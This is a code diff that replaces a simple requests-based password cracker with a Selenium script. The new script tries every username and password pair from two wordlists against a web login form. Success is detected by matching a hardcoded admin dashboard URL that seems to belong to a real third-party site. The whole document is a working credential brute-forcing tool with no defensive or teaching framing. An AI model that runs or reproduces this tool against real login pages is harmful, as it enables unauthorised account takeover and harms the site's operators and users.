@@ -1,40 +1,69 @@
-import requests
-from termcolor import colored
+import time
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
 
-# Prompt the user to input the target website URL, username, password list, and login failed string.
-url = input('[+] Enter Page URL: ')
-username = input('[+] Enter Username: ')
-password_file = input('[+] Enter Password List: ')
-login_failed_string = input('[+] Enter String That Occurs When Login Fails: ')
+# Configuration
+WAIT_TIME = 10  # Adjust this value as needed
+URL = input('[+] Enter Page URL: ')
+USERNAME_FILE = input('[+] Enter Username List: ')
+PASSWORD_FILE = input('[+] Enter Password List: ')
 
-# Define a function for attempting to crack the login with a provided username and password list.
-def cracking(username, url):
-    # Open the password list file and iterate through its contents.
-    with open(password_file, 'r') as passwords:
-        for password in passwords:
-            # Remove leading/trailing whitespace from the password.
+def setup_driver():
+    return webdriver.Chrome()
+
+def find_login_elements(driver):
+    driver.get(URL)
+    username_field = WebDriverWait(driver, WAIT_TIME).until(
+        EC.presence_of_element_located((By.ID, 'username'))
+    )
+    password_field = WebDriverWait(driver, WAIT_TIME).until(
+        EC.presence_of_element_located((By.ID, 'password'))
+    )
+    login_button = WebDriverWait(driver, WAIT_TIME).until(
+        EC.presence_of_element_located((By.XPATH, "//button[contains(@class, 'btn-outline-primary') and contains(@class, 'm-2')]"))
+    )
+    return username_field, password_field, login_button
+
+def attempt_login(username, password, driver):
+    username_field, password_field, login_button = find_login_elements(driver)
+    username_field.clear()
+    username_field.send_keys(username)
+    password_field.clear()
+    password_field.send_keys(password)
+    login_button.click()
+    time.sleep(2)
+
+def cracking(username_list, password_list, driver):
+    for username in username_list:
+        for password in password_list:
+            username = username.strip()
             password = password.strip()
-            print(colored(('Trying: ' + password), 'red'))
-            
-            # Create a dictionary containing the username, password, and a submit button for the POST request.
-            data = {'username': username, 'password': password, 'Login': 'submit'}
-            
-            # Send a POST request to the specified URL with the login data.
-            response = requests.post(url, data=data)
-            
-            # Check if the login failed based on the login_failed_string.
-            if login_failed_string in response.content.decode():
-                # If the login failed, continue to the next password.
-                pass
+            print(f'Trying Username: {username} with Password: {password}')
+
+            attempt_login(username, password, driver)
+
+            if 'https://a2padmin.mnpspbd.com/dashboard' in driver.current_url:
+                print(f'[+] Found Username: ==> {username}')
+                print(f'[+] Found Password: ==> {password}')
+                return True
+
+    return False
+
+def main():
+    driver = setup_driver()
+    try:
+        with open(USERNAME_FILE, 'r') as usernames, open(PASSWORD_FILE, 'r') as passwords:
+            username_list = usernames.readlines()
+            password_list = passwords.readlines()
+            combination_found = cracking(username_list, password_list, driver)
+            if combination_found:
+                print('[+] Combination Found')
             else:
-                # If the login was successful, print the username and password and exit the script.
-                print(colored(('[+] Found Username: ==> ' + username), 'green'))
-                print(colored(('[+] Found Password: ==> ' + password), 'green'))
-                exit()
+                print('[!] Username and Password Combination Not Found')
+    finally:
+        driver.quit()
 
-# Call the cracking function with the provided username and URL.
-with open(password_file, 'r') as passwords:
-    cracking(username, url)
-
-# If no matching password is found, print a message indicating that the password is not in the list.
-print('[!] Password Not in List')
+if __name__ == '__main__':
+    main()
